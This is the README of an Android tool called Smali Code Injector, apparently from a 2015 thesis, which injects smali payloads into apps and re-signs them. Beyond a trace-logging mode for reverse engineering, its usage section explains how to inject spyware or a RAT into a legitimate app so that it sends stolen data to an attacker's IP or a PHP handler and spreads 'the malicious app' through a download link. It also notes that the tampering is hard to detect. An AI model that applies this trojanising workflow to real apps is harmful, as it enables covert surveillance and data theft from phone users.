![SCI](images/sci_logo.png)
# Smali Code Injector 
## Automate assembly code injections within Android applications. 

The original purpose of this project was to automate the injection of stacktraces withing Andrdoid apps. Adding stacktraces helps in the process of reverse engineering and gives a good understanding of applications logic and workflow. Indeed, being able to obtain (log and print out) applications runtime method calls as well as the returned value would allow an attacker to save a considerable amount of time when reverse engineering complex Android applications and performing advanced code analysis. 

Lately, I improved SCI by adding new features and payloads to attempt to fully automate assembly code injections. As a result I ended up with this highly customisable modular framework that allows the creation/use of any assembly payload. Consequently, a user familiar with Android development could use SCI to create its own module and automate its payload injection without having to worry about the registers dependancie, type, etc.

More information about reverse engineering Android apps:

<http://www.n00blinuxhacker.com/android-pentesting-reverse-engineering-android-app.html>

### Automation for a better world
The code injection is performed at the assembly level (smali files). Which makes the identification of applications modified using SCI complicated and time consuming. This would require considerable of work (mainly network, permissions, signature and code analysis).

A high level overview of the different steps performed by SCI when injecting codes are:
* Disassembling the application
* Collecting relevant information about the application. 
	* Classes name.
	* Methods name.
	* Registers number and type.
	* etc.
* Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
* Injecting and tweaking up the selected payload within the targeted method(s).
* Reassembling and signing the app with a valid self-signed certificate.

## Usage
### Examples:
To inject a payload:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -d [download_link]
	[-a]: 	Android applicaion to modify.
	[-t]: 	smali file within the application where to perform the injection. If this argument is absent, the injection is performed within the whole app.
	[-k]: 	keywords to filter on. Ex: if -k "SSL,X509TrustManager" the payload will only be injected on the method containing SSL in their declaration header -help for certificate unpinning-.
	[-p]: 	payload to use. 
	[-rh]:  IP address of the attacker/script for sending the stolen data.
	[-d]:	link to download the malicious app -to propagate the malware-.

	Tip: Inject the rat on the onCreate() method of the main activity

To inject the Spyware:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -d [download_link]

	
	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php -don't forget to change the settings to connect to your DB-).
    [-d]:	link with the malicious app. 

To inject the Logger:

		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger

	Note: Connect your phone to your computer and use the following command to filter and print out only the modified app runtime method calls:

		$ adb logcat | grep "::trace

To identify the main activity location (works even with obfuscated app):

		$ python3 sci.py -a [apps] -s
		
To display the help menu:

		$ python3 sci.py  -h

## Dependencies
### Third-party libraries
#### progressbar:
You need to install the progressbar package available at the link below. Alternatively, you can also comment out every lines linked to the use of this library in the **payload.py** file.
	
<http://code.google.com/p/python-progressbar/>

Installation on Linux (debian):

	$ sudo apt-get install python3-progressbar -y

## Future Improvements
* Add new payloads (reverse shell).
* Source code optimisation.

## Project Information
This framework was developed in the context of my master thesis work in July 2015.	

## Licenses
### Smali Code Injector:
   Copyright (C) 2015 Alexandre Teyar

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

<http://www.apache.org/licenses/LICENSE-2.0>

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
   limitations under the License. 

### Apktool:
   Copyright (C) 2010 Ryszard Wiśniewski 

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

<http://www.apache.org/licenses/LICENSE-2.0>

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
   limitations under the License. 

### python-progressbar:
   Copyright (C) 2005 Nilton Volpato

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

<http://www.apache.org/licenses/LICENSE-2.0>

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
   limitations under the License.

### smali/baksmali:
   Copyright (c) 2010 Ben Gruver (JesusFreke)
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

1. Redistributions of source code must retain the above copyright
   notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright
   notice, this list of conditions and the following disclaimer in the
   documentation and/or other materials provided with the distribution.
3. The name of the author may not be used to endorse or promote products
   derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
